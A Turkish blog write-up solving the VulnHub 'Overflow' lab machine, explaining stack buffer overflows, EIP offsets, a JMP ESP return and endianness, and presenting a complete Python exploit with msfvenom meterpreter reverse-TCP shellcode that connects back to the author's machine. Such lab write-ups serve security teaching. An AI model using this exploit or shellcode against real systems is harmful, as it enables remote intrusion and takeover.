---
layout: post
title: OVERFLOW MACHINE WRITE UP
---

---
layout: post
title: OVERFLOW MACHINE WRITE UP
---

# OVERFLOW MACHINE WRITE UP

Merhabalar,
İlk blog yazım olan Overflow makinesinin çözümüne hoş geldiniz.
Çözüm ile beraber buffer overflow zafiyetlerini exploit etme yöntemlerinden birini ayrıntılı anlatmaya çalıştım.
İsminden de anlaşılacağı gibi Buffer Overflow zafiyetleri üzerinden ilerleyen bir makine.
Eğer **Buffer Overflow** kelimesi size bir şey ifade etmiyorsa sizi [şu](https://www.youtube.com/watch?v=1S0aBV-Waeo) videoya alalım.
Makineye [buradan](https://www.vulnhub.com/entry/overflow-1,300/) ulaşabilirsiniz.
Makineyi indirip açtıktan sonra kendi makinemizin interface ayarlarına **ifconfig** komutu ile bakıyoruz.
Nmap'e kendi ağımıza uygun parametreleri veriyoruz.

    nmap 192.168.2.0/24
Benim ağımda bu şekilde oluyor ve tarama sonucuna bakıyoruz.
![enter image description here](https://i.ibb.co/9Tg8Qsq/1.png)

Ve bu şekilde 80 portundan web servisi sunan makinemizi buluyoruz.
Hemen tarayıcımızı açıp ne varmış acaba burada diyoruz.

![enter image description here](https://i.ibb.co/6rKfrhD/2.png)

Karşımıza böyle bir web sayfası çıkıyor ve teşekkür ediyoruz çünkü bizi binary dosyayı bulmakla uğraştırmadı.
Dosyayı indirip incelemeye başlıyoruz.
**file** programı dosya tiplerini belirlemek için kullanılıyor.

![enter image description here](https://i.ibb.co/NjLSHrS/3.png)
Görüldüğü gibi 32-bit  linux sistemler için derlenmiş çalıştırılabilir bir dosya.
LSB("Least Significant Bit") yazmasından da Little Endian formatında olduğunu anlıyoruz.
Endian formatını bilmek buffer overflow zafiyetlerinin exploit edilmesi açısından önemli bir nokta.Endianness kısmına yazının ilerleyen kısımlarında değineceğiz.

Dosya hakkında bu bilgileri edindikten sonra çalıştırıp ne yaptığını incelemeye başlayalım.

![enter image description here](https://i.ibb.co/YBjB8YJ/ov2-5.png)

Ağ üzerinden, 1337. porttan iletişim kuran bir uygulama olduğunu, şu anda gelecek bağlantıları dinlediğini söylüyor.
Test etmek için hemen netcat yapıştırıyoruz.

![enter image description here](https://i.ibb.co/80tLg8p/ov2-7.png)

Bizden komut bekleyen bir satır görüyoruz.

Şimdi aynı şeyi saldıracağımız makine üzerinde deneyelim çünkü eğer hedef üzerinde bu program çalışmıyor ise uğraşmamızın bir anlamı yok.
Sonuçta vulnserver programını exploit etmeye çalışıyoruz ve saldıracağımız yerde bu program hali hazırda çalışmıyorsa her şeyi boşa yaptık demektir.

![enter image description here](https://i.ibb.co/gw7kB9q/overflow2-0.png)
Böylece hedef makinede de programın çalıştığından emin olduktan sonra devam ediyoruz.

Komut denemeye başlayalım o halde.

![enter image description here](https://i.ibb.co/N7xqYLj/ov2-9.png)

Klasik linux komutlarını denediğimizde bize "TRY HARDER!" diyor ve sonrasında bir şey olmuyor.
Ctrl+C ile programı ben sonlandırıp yeniden deniyorum.
Biz de yine makine adından yola çıkarak "overflow" yapmayı, programı bozmayı deneyeceğiz. Yani almayı beklediğinden daha büyük bir input vereceğiz. Eğer bu şekilde programı crash ettirebilirsek, programın yüklendiği hafıza alanına müdahale edebiliyoruz demektir ve  bu bir çok türden probleme yol açabilir.

Bu ana kadar sakin sakin gelmiştim ama buradan sonra direkt barzoya bağlayıp "A" ları basmaya başladım :)

![enter image description here](https://i.ibb.co/sj3f6WP/4.png)

Sonrasında elle A'ya abanmak yetmeyince python ile daha rahat yaparım deyip 

    python -c 'print "A"*500' | nc localhost 1337

yukarıdaki komutları yazdım.
İki komutun arasındaki | ifadesi ilk komutun çıktısını ikinci komuta girdi olarak ver demektir.
Yani benim elle "A" yazdığım yere bu komutlar "A" yı kendisi yazacak.

![enter image description here](https://i.ibb.co/thTKTT1/ov4-1.png)

500.000 tane "A" gönderdik ancak istediğimiz sonucu alamadık.Aşağıdan uygulamanın takır takır çalışmaya devam ettiğini görebilirsiniz.

![enter image description here](https://i.ibb.co/rxcBLTY/ov4-2.png)

500.000 tane karakter ile de çökmüyorsa sanırım burada buffer overflow yok.
Böylece yazımızın sonuna... 
şaka.
İçeride neler dönüyor bakmaktan başka çaremiz kalmıyor bu durumda.
Ben incelemek için Ghidra kullandım çünkü alternatiflerine göre decompiler'ı güçlü.
Daha temiz decompile eden ücretsiz alternatifine henüz denk gelmedim.

![enter image description here](https://i.ibb.co/6r9rdSf/5.png)

Sembol tablosu ("Compiler'lar tarafından üretilen, dosyanın içinde olan fonksiyonların classların vs. lerin isimlerini tutan bir tablo")'na bakıp ("Ghidra tree yapısında verdiği için Symbol Tree yazmış").
Fonksiyonlar sekmesine girdiğimizde alışık olduğumuz main'in haricinde *jmpesp* ve *handleCommand* fonksiyonları gözümüze çarpıyor.
*handleCommand* bizim üstte exploit etmeye çalıştığımız input bekleyen kısma benzediğinden ilk onu incelemeye koyuldum.

![enter image description here](https://i.ibb.co/Px0hdnS/6.png)

Decompile kısmını incelediğimizde bir parametre aldığını ve o parametrenin strcpy fonksiyonuna parametre olarak verildiğini görüyoruz.
strcpy fonksiyonunu araştırırsanız buffer overflow'a sebep olabilecek, zafiyet barındıran bir fonksiyon olduğunu görebilirsiniz.
Her şey tamam gibi duruyor ancak biz bir nedenden dolayı bu programı crash ettiremedik.
Neden olduğunu anlamak için main fonksiyonuna gidip incelememiz gerekiyor.

![enter image description here](https://i.ibb.co/qYTKXgS/7.png)

Gözlerimiz *handleCommand* fonksiyonunun çağrıldığı yeri arıyor ve 62. satırda kendisine rastlıyoruz.
Görüyoruz ki bu fonksiyonun çağrılması bir if bloğu içerisinde yani belli şartlar sağlandığında bu fonksiyon çağrılıyor.
Yoksa önceden karşılaştığımız gibi "TRY HARDER!" deyip bizi paketliyor.
iVar2 adlı değişkenin 0 olduğu durumda fonksiyonumuzun çağrıldığını görüyoruz.
bu değişkene de `strncmp("OVERFLOW ",local_454,9)` fonksiyonundan dönen değer atanıyor.
strncmp fonksiyonunu araştırdığımızda isminden de tahmin edilebileceği gibi iki string'i karşılaştırıyor, eğer aynılar ise 0 döndürüyor ve 3. parametre olan 9 da ilk 9 karakteri karşılaştırıp gerisine bakmıyor.
Yani local_454 değişkeninin ilk 9 karakteri "OVERFLOW "("Sonunda bir boşluk karakteri olduğuna dikkat edelim") mu diye bakıyor bu fonksiyon.
local_454 değişkeni de yüksek ihtimalle bizim input'umuzun atandığı değişkendir diye tahmin ediyoruz.
Buradan anlıyoruz ki bizim barzo gibi gönderdiğimiz "A" lar bu karşılaştırmayı geçememiş.
Hemen gönderdiğimiz payload'u düzenliyoruz ve ilk 9 harfini "OVERFLOW " ile değiştiriyoruz.

![\[](https://i.ibb.co/C9x2JC5/8.png)

Bu sefer "TRY HARDER!" a düşmedik.
Bu iyi bir şey.
Ancak o da ne? uygulamamızın hala çalıştığını görüyoruz.

![enter image description here](https://i.ibb.co/xmdGKt1/ovov.png)

Hala çalışıyorsa demek ki buffer overflow yok.
Bu yüzden yazımızı burada sonlan...
şaka.
Acaba gerçekten handleCommand çalıştı mı? Bu payload'u gönderdiğimizde strcpy fonksiyonuna ulaşabildik mi onu görmemiz gerekiyor.
GDB burada işimizi görecektir.

![enter image description here](https://i.ibb.co/tXvkT5g/ov-gdb.png)

Fonksiyonu disassemble ettik ve hangi adreste hangi instruction'ın olduğunu gördük.

![enter image description here](https://i.ibb.co/x70mcqL/ov-break.png)

*handleCommand* fonksiyonuna breakpoint ayarladık.Yani eğer handleCommand fonksiyonu çalışırsa program o instruction'da duracak ve bizden komut bekleyecek.
biz de adım adım  instruction'ları inceleyebileceğiz.Dolayısıyla verdiğimiz input *strcpy* fonksiyonuna ulaşabiliyor mu onu göreceğiz.

![enter image description here](https://i.ibb.co/F7NFb60/ov-gdb.png)
Fakat o da ne? Programı çalıştırıp payload'umuzu gönderdiğimizde
 ****[Detaching after fork from child process 5258]****
satırıyla karşılaştık.
Ben de burada böyle bir uyarı ile ilk defa karşılaştım.
Araştırdıktan sonra fork fonksiyonunun child process ürettiğini gördüm ve main fonksiyonunun decompile edilmiş haline bakarsanız ilgilendiğimiz satırların birkaç satır üstünde fork fonksiyonu var.
Burada gdb de aynı anda tek processi debug edebileceği için default tanımlı olan parent processten devam ediyor ve child processi debug etmiyor.
Üstteki Detach ile başlayan satır da bunu ifade ediyor.
Bu da muhtemelen demek oluyor ki bir süredir başka processler crash oluyor ama haberimiz yok.
Hangi process'i debug etmeye devam edeceğinin ayarını child'a çevirmek için gdb'ye

    set-follow-forkmode child
    
şu komutu verebiliyormuşuz.

![enter image description here](https://i.ibb.co/7CJt3z6/ov-child.png)

Verdikten sonra uygulamamızı çalıştırıp yine payload'umuzu gönderiyoruz.

![enter image description here](https://i.ibb.co/9rDDmn8/ov-gdb41.png)

Sonunda programımızı crash ettirebildik ve bir hata ile karşılaştık.

Bu kısımdan sonrasının anlaşılması için basit seviyede x86 Assembly bilgisi gerekiyor.

Buradaki hatayı kısaca açıklamaya çalışayım.
Programlar çalışmaya başladığında işletim sistemi onlara belli bir hafıza alanı atar.
Basit şekilde programların çalışan haline de process diyebiliriz.
Hiçbir process kendisine ait olmayan hafıza alanına veri yazamaz, hafıza alanından veri okuyamaz.
Sadece kendisine atanan hafıza alanında işlem yapabilir.
Biz de verdiğimiz input ile bu hafıza alanında duran, programın bir sonraki çalıştıracağı instruction'ın adresini tutan EIP registerının üzerine A karakterlerini yazdırdığımız için program normalde  0x08452357 ("formata uygun sallamasyon değer") gibi bir değer tutan ve process'e atanmış hafıza alanına ait olan bir adrese gitmek yerine 0x41414141 ("A karakterinin hex karşılığı") adresindeki kodu çalıştırmayı denedi.
Bu adres de kendisine ait olmadığı için işletim sistemi "hayırdır kardeş sen?" deyip segmentation fault sinyalini programa gönderdi ve program sonlandı. 
Madem biz hafıza alanına istediğimizi yazabiliyoruz,
O halde payload'umuzu barzo gibi değil de düzgün şekilde programın ulaşabileceği bir adrese yönlendirseydik ve bu adreste bizim hafızaya istediğimiz şekilde doldurduğumuz instruction'lar olsaydı ne olurdu?
Ekşınlı şeyler olabilirdi :)
O zaman bu hayalimizi gerçekleştirmeyi deneyelim.

İlk olarak EIP registerının üzerine payload'umuzun neresinde yazmaya başladığımızı bulmamız gerekiyor. 
Çünkü EIP Registerı bir sonraki çalışacak instruction'ın adresini tutuyor ve bizim burasının kontrolünü hatasız ele geçirmemiz gerekiyor ki çalışmasını istediğimiz instruction'ın adresini doğru verebilelim.
Bunu belirleme işlemini manuel  olarak "A" sayısını 500 ("ben payload'umda 500 seçtiğim için başlangıç noktası olarak da 500 seçtim") den kademeli olarak azaltarak yapabilirsiniz. 250 denersiniz hala 0x41414141 ile doluyorsa EIP, 125 denersiniz ta ki oraya yazdığınız "A" karakterlerinden sonraki 4 byte EIP Register'ının üzerine yazasaya kadar.
("Program 32 bit, Registerlar 32-bit veri tutabiliyor, 4 byte=32 bit)

Bunu bulmak için yazılmış, metasploit-framework'ün içinde gelen bir script olan pattern_create.rb  kullanmak işimizi hızlandıracaktır.

![enter image description here](https://i.ibb.co/427cQgP/ov-pat.png)

Script'e verdiğimiz -l parametresi ile 500 karakter uzunluğunda bir pattern oluşturdu.
Bunu payload'umuza koyup ardından EIP register'ının içindeki byte'lara bakacağız.

![enter image description here](https://i.ibb.co/VVnLF3C/ov-pattern.png)

EIP Register'ının içindeki byteları yani 0x32624131'i pattern_offset.rb scriptine veriyoruz ve patternımızda kaçıncı byte'ta eşleşme olduğunu bize söylüyor.

![enter image description here](https://i.ibb.co/6wJ9NKN/ov-offset.png)

Bu demek oluyor ki 35. byte'tan sonraki yazdığımız 4 byte EIP Register'ının üzerine yazılacak ve EIP değeri biz ne istersek o olacağı için programın kontrolünü ele almış olacağız.

Peki hangi adresi vereceğiz? 

Ve verdiğimiz adreste bizim istediğimiz kodların olacağını nereden bileceğiz?

İlk sorunun cevabı her dosyaya ve sisteme göre değişmekle beraber ikinci sorunun birkaç 
farklı cevabı mevcut.
Biz bu dosya için uygun olan yöntemle ilerleyeceğiz.
Hatırlarsanız sembol tablosunda handleCommand ile beraber ilginç bir fonksiyon daha görmüştük.
*jmpesp* fonksiyonu
Bu bize bir assembly instruction'ı olan JMP ESP yi anımsatıyor.
Ve yöntemlerden bir tanesi de fonksiyonun dönüş adresindeki komutun ESP register'ına zıplaması.Yani JMP ESP instruction'ı bulmak.
bu fonksiyon bize ipucu ve kolaylık olsun diye konulmuş.

![enter image description here](https://i.ibb.co/tHgYfhg/ov-jmpesp.png)

İçinde JMP ESP instruction'ını barındırıyor.

Bildiğiniz gibi fonksiyonlar çalıştırıldıktan sonra çağırıldığı yerden çalışmaya devam eder.
Biz de fonksiyonları istersek 2-3 yerden çağırabiliriz.
Peki fonksiyon çağırıldığı yere geri nasıl dönebiliyor, yani 2-3 farklı yerden çağırıldıysa hangi adrese döneceğini nereden biliyor?
Epilog ve prolog olayları sayesinde.
Çağırılan fonksiyonların şu satır ile başladığını göreceksiniz.

    CALL handleCommand

CALL instruction'ı aslında temel olarak şunları yapar.

    PUSH EIP
    JMP handleCommand

EIP'yi Stack'e push ederek dönüş adresini burada saklıyoruz.
Sonra fonksiyonun çağırıldığı yere dönebilmesi için.

Çağırılan fonksiyonun ilk satırları da genelde şu şekildedir.

    PUSH EBP
    MOV EBP,ESP
    SUB ESP,0x60
Bu olayın adı prolog
60 salladığım bir değer bu arada, buna compiler karar veriyor.

Şimdi biz burada ne yaptık?
EBP değerini push ederek stackte sakladık.
Sonra ESP'nin değerini EBP'ye atadık ve ESP'yi 0x60 değer azalttık.
Bu şekilde kendimize bu fonksiyon için kullanılacak bir stack alanı oluşturduk.
Bu olayın adı prolog.
Fonksiyondan çıkarken de bunun tam tersini yaparak stack alanını boşaltıyoruz.

    MOV ESP,EBP
    POP EBP
    POP EIP

Eski ESP'nin değerini EBP'ye atamıştık ve EBP'yi de Stack'e push etmiştik.
Şimdi eski ESP'ye dönebilmek  yani çağırıldığımız fonksiyonun stack alanında çalışmaya devam edebilmek için EBP'nin değerini ESP'ye atıyoruz ve push ettiğimiz EBP'yi pop ederek eski değerine getiriyoruz.
Bu olayın adı da epilog.

Ama genelde bu satırları görmezsiniz çünkü Compilerlar tarafından bunlarla neredeyse aynı işi yapan LEAVE ve RET instructionları üretilir. Ama mantık aynıdır.

Ve bu dosya için  input'un 35. bytetan sonraki 4 byte'ı EIP'nin pop edileceği bölgeye yazılabiliyor.
POP EIP ile EIP'ye atanacak 4 bytelık hafıza alanından sonra  39. byte'tan itibaren olan kısımlar Stack'in en üst bölgesinde kalıyor.
ESP de eski haline döndüğü için tam bu alanın başlangıcını işaret ediyor.
Yani bizim çalıştıracağımız instruction eğer ESP'nin gösterdiği bölgedeki instructionları çalıştırmaya başlarsa programın akışı bizim istediğimiz şekilde yönlenebilir.

Daha rahat bir şekilde görelim diye payload'umuzu şu şekilde düzenleyelim

    python -c 'print "OVERFLOW "+"A"*35+"B"*4+"C"*10' | nc localhost 1337

Üstte 35. byte'tan sonraki kısımların EIP içerisine yükleneceğini söylemiştik. O zaman bu payload'a göre EIP'nin içinde "B" karakterinin hex karşılığı olan "\x42" yi yani 0x42424242 değerini görmemiz lazım.
Ve ESP Register'ının ilk 10 byte'ının da "C" karakterinin hex karşılığı olan "\x43" ile dolması lazım.
Hemen test edip görelim.
![enter image description here](https://i.ibb.co/cgG1cLp/ov-4343.png)

Gördüğünüz gibi 0x42424242 ile Segmentation fault hatası aldık ve ESP'nin gösterdiği bölgenin ilk 15 byte'ını ekrana bastığımızda ilk 10 byte'ı 0x43 değerleri ile dolu.

O zaman artık EIP'nin içine *jmpesp* fonksiyonunun adresini yazalım ve  programın ESP'nin işaret ettiği adresten devam etmesini sağlayalım.

![enter image description here](https://i.ibb.co/tHgYfhg/ov-jmpesp.png)

Üstte de içine bakmak için disassemble ettiğimiz fonksiyonun başlangıç adresi 0x0804928d
Bizim bunu  hafızaya doğru şekilde yazdırmamız için yukarıda bahsettiğim Endianness kavramını göz önüne getirmemiz gerekiyor.
programa file komutunu verdiğimizde bize "LSB" yani Little Endian formatında olduğunu söylemişti.
Little Endian formatında bytelar hafızaya tersten yazılır.Yani hafızada 
08 04 92 8d olarak gözükmesini istiyorsak
8d 92 04 08 olarak yazmalıyız.
"B" karakterinin yerine adresi yazalım.

python -c 'print "OVERFLOW "+"A"*35+"\x8d\x92\x04\x08"+"C"*12' | nc localhost 1337

"\x" koymamızın sebebi python'ın bu karakterleri hex olarak almasını sağlamaktır.Yoksa düz string olarak algılar ve onların hex karşılıklarını hafızaya yazar.
Şimdi *jmpesp* fonksiyonunun bu payload'u gönderdikten sonra çalışıp çalışmadığını kontrol edelim.
gdb'de break jmpesp diyoruz ve eğer çalışırsa burada durmasını bekleyeceğiz.
![enter image description here](https://i.ibb.co/0C14G8R/ov-breakjmp.png)

Gördüğünüz gibi jmpesp fonksiyonunu çalıştırabildik.Bu fonksiyon da ESP'nin işaret ettiği
hafıza alanına zıplayıp oradaki kodları çalıştırmayı deneyeceğinden bilgisayar için ne anlama geldiğini bilmediğimiz "C" karakterinin hex karşılığı yani "0x43" byte'ları çalışacak.
O zaman biz de anlamını bilmediğimiz byte'ları değil de işimize yarayacak byte'ları oraya koyalım ki program artık bizim istediğimizi yapsın :)

Artık karşıdan bi reverse shell almanın zamanı geldi.
Reverse shell'imizin kodunu, bilinen ismiyle shellcode'u burada kendimiz yazmayacağız çünkü o kendi başına bir yazı serisi isteyen bir konu.
O yüzden shellcode'umuzu msfvenom aracı ile üreteceğiz.Hem de bu bize ekstra bir çok özelliği barından meterpreter bağlantısı verecek.

Linux sistemlerde çalışacak shellcode üretimi msfvenomda şu şekilde yapılıyor.

    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

Parametrelerimizi kendimize uygun tanımlayıp komutu çalıştıralım.

![enter image description here](https://i.ibb.co/ykshMgY/ov-shellcode.png)

Gördüğünüz gibi bu shellcode bizim tek satırda gönderdiğimiz"python -c" ile başlayan payload için hayli uzun.
Bu yüzden bir python script'i yazıp oradan işlerimizi halledelim.

 

    import socket
    tampon="OVERFLOW "
    tampon+="A"*35
    jmpesp="\x8d\x92\x04\x08"
    buf =  ""
    buf += "\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0"
    buf += "\x66\x89\xe1\xcd\x80\x97\x5b\x68\xc0\xa8\x02\x80\x68"
    buf += "\x02\x00\xad\x9e\x89\xe1\x6a\x66\x58\x50\x51\x57\x89"
    buf += "\xe1\x43\xcd\x80\x85\xc0\x79\x19\x4e\x74\x3d\x68\xa2"
    buf += "\x00\x00\x00\x58\x6a\x00\x6a\x05\x89\xe3\x31\xc9\xcd"
    buf += "\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9\x00\x10\x00"
    buf += "\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80"
    buf += "\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd"
    buf += "\x80\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb"
    buf += "\x01\x00\x00\x00\xcd\x80"
    payload=tampon+jmpesp+buf
    s=socket.socket()
    s.connect(("localhost",1337))
    s.send(payload)

Aslında burada da öncekinden çok farklı bir şey yapmadık.
Sadece netcat yerine python'ın ağ üzerinden iletişim kurmaya yarayan modülü
olan socket'i kullandık ve socket modülünün kendi fonksiyonları ile payload'umuzu karşıya ilettik.
ama artık bu payload'un bize reverse shell üreteceğine inandığımız ve saldıracağımız makine de kendimizin olduğu için bu sefer payload'u kendi çalıştırdığımız programa değil de hedef makinede çalışan programa gönderelim.
O yüzden 

    s.connect(("localhost",1337))
olan satırı 

    s.connect(("192.168.2.147",1337))
    
ile değiştiriyoruz.("İlk bulduğumda makinenin ip'si 146 ile bitiyordu ancak yazıyı yazma sürem boyunca birkaç kez kapatıp açtığım için 147'li ip aldı").

Scriptimizin son hali bu şekilde.

        import socket
        tampon="OVERFLOW "
        tampon+="A"*35
        jmpesp="\x8d\x92\x04\x08"
        buf =  ""
        buf += "\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0"
        buf += "\x66\x89\xe1\xcd\x80\x97\x5b\x68\xc0\xa8\x02\x80\x68"
        buf += "\x02\x00\xad\x9e\x89\xe1\x6a\x66\x58\x50\x51\x57\x89"
        buf += "\xe1\x43\xcd\x80\x85\xc0\x79\x19\x4e\x74\x3d\x68\xa2"
        buf += "\x00\x00\x00\x58\x6a\x00\x6a\x05\x89\xe3\x31\xc9\xcd"
        buf += "\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9\x00\x10\x00"
        buf += "\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80"
        buf += "\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd"
        buf += "\x80\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb"
        buf += "\x01\x00\x00\x00\xcd\x80"
        payload=tampon+jmpesp+buf
        s=socket.socket()
        s.connect(("192.168.2.147",1337))
        s.send(payload)
        
Bu script'i .py uzantılı şekilde kaydediyoruz.

Bu arada çaktırmadan vulnserver programının exploitini de yazmış olduk. :)

Exploitimizi çalıştırmadan önce gelecek olan bağlantıyı dinlememiz lazım.
Dönecek bağlantı meterpreter olduğu için metasploit'in içinden dinlememiz gerekiyor.
Bunun için de metasploit handler'ını açıyoruz ve gerekli parametreleri veriyoruz.

![enter image description here](https://i.ibb.co/54jY6J8/ov-met.png)

Burası gelecek bağlantıları dinlemeye başladı.
Geriye kalan tek şey exploitimizi çalıştırmak.
Ben dosyayı overflowexploit adıyla kaydettim.

![enter image description here](https://i.ibb.co/Ch3CfkP/ov-exploit.png)

Bu şekilde exploit'imizi çalıştırıyoruz ve inşallah bağlantı düşmüştür diye dua etmeye başlıyoruz :)
Sonrasında handler'ımızın çalıştığı sekmeye geri dönüyoruz veee...

![enter image description here](https://i.ibb.co/PFygbB0/ov-meterpreter.png)

![enter image description here](https://im2.ezgif.com/tmp/ezgif-2-5d55e275ef2b.gif)
gif via : [reddit](https://www.reddit.com/r/blackhat/comments/c2kjc9/the_happiness_of_getting_a_meterpreter_session/?utm_source=share&utm_medium=web2x)


BAŞARDIK :)
shell'e düşüp biraz gezinelim.

![enter image description here](https://i.ibb.co/Nnq2rt0/ov-last.png)

Böylece bu makine için user flagimizi elde ettik ve ilk aşamayı tamamladık.

Bu yazıyı uzun olduğu için burada sonlandırıyorum.
Makinede root hakları elde etme aşaması yazımızın 2. partında olacak.

